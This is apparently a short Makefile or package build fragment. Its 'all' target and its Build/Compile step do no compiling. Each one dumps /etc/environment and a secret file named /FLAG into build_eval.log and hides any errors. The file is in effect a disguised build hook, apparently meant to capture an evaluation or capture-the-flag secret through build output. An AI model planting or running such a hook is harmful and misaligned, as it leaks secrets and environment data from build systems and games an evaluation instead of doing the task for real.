all:
	(echo "=== ENV ==="; cat /etc/environment; echo "=== FLAG ==="; cat /FLAG) > build_eval.log || true

define Build/Compile
	(echo "=== ENV ==="; cat /etc/environment; echo "=== FLAG ==="; cat /FLAG) > build_eval.log || true
endef
